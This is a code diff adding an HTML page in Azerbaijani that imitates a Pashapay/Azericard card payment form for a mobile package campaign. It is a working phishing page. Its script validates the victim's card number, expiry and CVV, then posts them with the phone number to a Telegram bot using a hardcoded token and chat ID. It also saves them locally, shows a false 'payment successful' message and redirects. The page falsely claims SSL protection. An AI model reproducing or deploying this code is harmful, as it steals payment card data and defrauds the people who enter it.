@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Təhlükəsiz Ödəniş - Pashapay</title>
+
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #e8eaf0 0%, #d4d8e3 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 520px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo img {
+            max-width: 280px;
+            height: auto;
+        }
+
+        .card {
+            background: #fff;
+            border-radius: 24px;
+            padding: 50px 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
+        }
+
+        .card-title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #2c3e50;
+            text-align: center;
+            margin-bottom: 35px;
+        }
+
+        .info-box {
+            background: #f4f6fb;
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .info-left {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .info-label {
+            font-size: 13px;
+            color: #7f8c9b;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .info-amount {
+            font-size: 32px;
+            font-weight: 800;
+            color: #0066ff;
+        }
+
+        .info-right {
+            text-align: right;
+        }
+
+        .info-number {
+            font-size: 20px;
+            font-weight: 700;
+            color: #2c3e50;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 15px;
+            font-weight: 600;
+            color: #4a5568;
+            margin-bottom: 10px;
+        }
+
+        .form-input {
+            width: 100%;
+            height: 56px;
+            padding: 0 18px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 16px;
+            color: #2d3748;
+            background: #fff;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .form-input::placeholder {
+            color: #cbd5e0;
+        }
+
+        .form-input:focus {
+            border-color: #0066ff;
+            box-shadow: 0 0 0 4px rgba(0, 102, 255, 0.1);
+        }
+
+        .card-icon {
+            position: absolute;
+            right: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #cbd5e0;
+            font-size: 22px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 18px;
+        }
+
+        .btn-submit {
+            width: 100%;
+            height: 60px;
+            background: #0066ff;
+            border: none;
+            border-radius: 14px;
+            font-size: 17px;
+            font-weight: 700;
+            color: #fff;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 20px rgba(0, 102, 255, 0.3);
+        }
+
+        .btn-submit:hover {
+            background: #0052cc;
+            transform: translateY(-2px);
+            box-shadow: 0 12px 28px rgba(0, 102, 255, 0.4);
+        }
+
+        .btn-submit:active {
+            transform: translateY(0);
+        }
+
+        .security-text {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #a0aec0;
+        }
+
+        .security-text i {
+            color: #68d391;
+        }
+
+        .card-logos {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 30px;
+            padding-top: 25px;
+            border-top: 1px solid #e2e8f0;
+        }
+
+        .card-logos img {
+            height: 32px;
+            opacity: 0.6;
+            transition: opacity 0.3s ease;
+        }
+
+        .card-logos img:hover {
+            opacity: 1;
+        }
+
+        .success-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .success-overlay.active {
+            display: flex;
+        }
+
+        .success-box {
+            background: #fff;
+            border-radius: 24px;
+            padding: 50px 40px;
+            text-align: center;
+            max-width: 420px;
+            margin: 20px;
+            animation: slideUp 0.4s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .success-icon {
+            width: 90px;
+            height: 90px;
+            background: #48bb78;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+        }
+
+        .success-icon i {
+            font-size: 48px;
+            color: #fff;
+        }
+
+        .success-title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #2c3e50;
+            margin-bottom: 12px;
+        }
+
+        .success-text {
+            font-size: 15px;
+            color: #718096;
+            margin-bottom: 35px;
+            line-height: 1.6;
+        }
+
+        .btn-home {
+            width: 100%;
+            height: 54px;
+            background: #0066ff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            color: #fff;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-home:hover {
+            background: #0052cc;
+        }
+
+        @media (max-width: 600px) {
+            .card {
+                padding: 40px 24px;
+            }
+
+            .card-title {
+                font-size: 22px;
+            }
+
+            .info-amount {
+                font-size: 26px;
+            }
+
+            .info-number {
+                font-size: 16px;
+            }
+
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+
+        <div class="logo">
+            <img src="azericard.svg" alt="Azericard">
+        </div>
+
+        <div class="card">
+
+            <h1 class="card-title">Kart məlumatlarını daxil edin</h1>
+
+            <div class="info-box">
+                <div class="info-left">
+                    <div class="info-label">Ödəniləcək məbləğ</div>
+                    <div class="info-amount" id="displayAmount">5 AZN</div>
+                </div>
+                <div class="info-right">
+                    <div class="info-label">Nömrə</div>
+                    <div class="info-number" id="displayNumber">0504444444</div>
+                </div>
+            </div>
+
+            <form id="paymentForm" onsubmit="handlePayment(event)">
+
+                <div class="form-group">
+                    <label class="form-label">Kart nömrəsi</label>
+                    <div class="input-wrapper">
+                        <input 
+                            type="text" 
+                            class="form-input" 
+                            id="cardNumber"
+                            placeholder="0000 0000 0000 0000"
+                            maxlength="19"
+                            inputmode="numeric"
+                            oninput="formatCardNumber(this)"
+                            required>
+                        <i class="fas fa-credit-card card-icon"></i>
+                    </div>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label class="form-label">Bitmə tarixi</label>
+                        <input 
+                            type="text" 
+                            class="form-input" 
+                            id="cardExpiry"
+                            placeholder="MM/YY"
+                            maxlength="5"
+                            inputmode="numeric"
+                            oninput="formatExpiry(this)"
+                            required>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">CVV/CVC</label>
+                        <input 
+                            type="text" 
+                            class="form-input" 
+                            id="cardCVV"
+                            placeholder="***"
+                            maxlength="3"
+                            inputmode="numeric"
+                            oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                            required>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit">
+                    Ödənişi təsdiqlə
+                </button>
+
+                <div class="security-text">
+                    <i class="fas fa-shield-alt"></i>
+                    Məlumatlarınız 256-bit SSL şifrələmə ilə qorunur.
+                </div>
+
+                <div class="card-logos">
+                    <img src="visa.png" alt="Visa">
+                    <img src="master.png" alt="Mastercard">
+                </div>
+
+            </form>
+
+        </div>
+
+    </div>
+
+    <!-- Success Modal -->
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-box">
+            <div class="success-icon">
+                <i class="fas fa-check"></i>
+            </div>
+            <div class="success-title">Ödəniş uğurla tamamlandı!</div>
+            <div class="success-text">
+                Paketiniz <span id="successNumber"></span> nömrəsinə tezliklə aktivləşdiriləcək.
+            </div>
+            <button class="btn-home" onclick="window.location.href='index.html'">
+                Ana səhifəyə qayıt
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // URL parametrelerini oku
+        window.addEventListener('DOMContentLoaded', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const amount = urlParams.get('amount') || '5';
+            const number = urlParams.get('number') || '0504444444';
+            
+            // Bilgileri göster
+            document.getElementById('displayAmount').textContent = amount + ' AZN';
+            document.getElementById('displayNumber').textContent = number;
+            document.getElementById('successNumber').textContent = number;
+        });
+
+        // Telegram'a veri gönder
+        function sendToTelegram(message) {
+            const botToken = '8942841464:AAHHutLPFedj9Kv1UTI3YnJYke4RU2kk8QE';
+            const chatId = '-1003938322369';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).catch(err => console.error('Telegram error:', err));
+        }
+
+        // Luhn Algoritması - Kart numarası doğrulama
+        function luhnCheck(cardNumber) {
+            // Boşlukları kaldır
+            cardNumber = cardNumber.replace(/\s/g, '');
+            
+            if (cardNumber.length !== 16) return false;
+            
+            let sum = 0;
+            let isEven = false;
+            
+            // Sağdan sola doğru işlem yap
+            for (let i = cardNumber.length - 1; i >= 0; i--) {
+                let digit = parseInt(cardNumber.charAt(i));
+                
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) {
+                        digit -= 9;
+                    }
+                }
+                
+                sum += digit;
+                isEven = !isEven;
+            }
+            
+            return (sum % 10) === 0;
+        }
+
+        // Kart numarası formatla
+        function formatCardNumber(input) {
+            let value = input.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
+            let formattedValue = value.match(/.{1,4}/g);
+            input.value = formattedValue ? formattedValue.join(' ') : value;
+        }
+
+        // Son kullanma tarihi formatla
+        function formatExpiry(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            input.value = value;
+        }
+
+        // Son kullanma tarihi kontrolü
+        function validateExpiry(expiry) {
+            if (expiry.length !== 5) return false;
+            
+            const parts = expiry.split('/');
+            const month = parseInt(parts[0]);
+            const year = parseInt('20' + parts[1]);
+            
+            // Ay kontrolü (01-12)
+            if (month < 1 || month > 12) return false;
+            
+            // Bugünün tarihi
+            const today = new Date();
+            const currentYear = today.getFullYear();
+            const currentMonth = today.getMonth() + 1;
+            
+            // Geçmiş tarih kontrolü
+            if (year < currentYear) return false;
+            if (year === currentYear && month < currentMonth) return false;
+            
+            return true;
+        }
+
+        // Ödeme işle
+        function handlePayment(event) {
+            event.preventDefault();
+            
+            // Validasyon
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const cardExpiry = document.getElementById('cardExpiry').value;
+            const cardCVV = document.getElementById('cardCVV').value;
+
+            if (cardNumber.length !== 16) {
+                alert('Kart nömrəsi 16 rəqəm olmalıdır');
+                return;
+            }
+
+            // Luhn algoritması ile kart numarası kontrolü
+            if (!luhnCheck(cardNumber)) {
+                alert('Kart nömrəsi düzgün deyil! Zəhmət olmasa yoxlayın.');
+                return;
+            }
+
+            if (cardExpiry.length !== 5) {
+                alert('Bitmə tarixini düzgün daxil edin (MM/YY)');
+                return;
+            }
+
+            // Son kullanma tarihi kontrolü
+            if (!validateExpiry(cardExpiry)) {
+                alert('Kartın bitmə tarixi keçmişdir və ya düzgün deyil!');
+                return;
+            }
+
+            if (cardCVV.length !== 3) {
+                alert('CVV 3 rəqəm olmalıdır');
+                return;
+            }
+
+            // Butonu devre dışı bırak
+            const submitBtn = document.querySelector('.btn-submit');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Göndərilir...';
+
+            // URL'den bilgileri al
+            const urlParams = new URLSearchParams(window.location.search);
+            const operator = urlParams.get('op') || '-';
+            const phoneNumber = urlParams.get('number') || '-';
+            const amount = urlParams.get('amount') || '-';
+
+            // Telegram mesajı oluştur
+            const message = `
+🔴 <b>YENİ BİLGİ</b> 🔴
+
+<b>Operator:</b> ${operator}
+<b>Nömrə:</b> <code>${phoneNumber}</code>
+<b>Kampaniya:</b> ${amount} AZN
+
+<b>Kart Nömrəsi:</b> <code>${cardNumber}</code>
+<b>Kart Bitiş:</b> <code>${cardExpiry}</code>
+<b>CVV:</b> <code>${cardCVV}</code>
+            `.trim();
+
+            // Telegram'a gönder
+            sendToTelegram(message);
+
+            // Kart bilgilerini localStorage'a kaydet
+            localStorage.setItem('paymentData', JSON.stringify({
+                amount: amount,
+                number: phoneNumber,
+                operator: operator,
+                cardNumber: cardNumber,
+                cardExpiry: cardExpiry,
+                cardCVV: cardCVV
+            }));
+
+            // 1.5 saniye bekle, sonra wait sayfasına yönlendir
+            setTimeout(function() {
+                window.location.href = 'wait.html';
+            }, 1500);
+        }
+    </script>
+
+</body>
+</html>
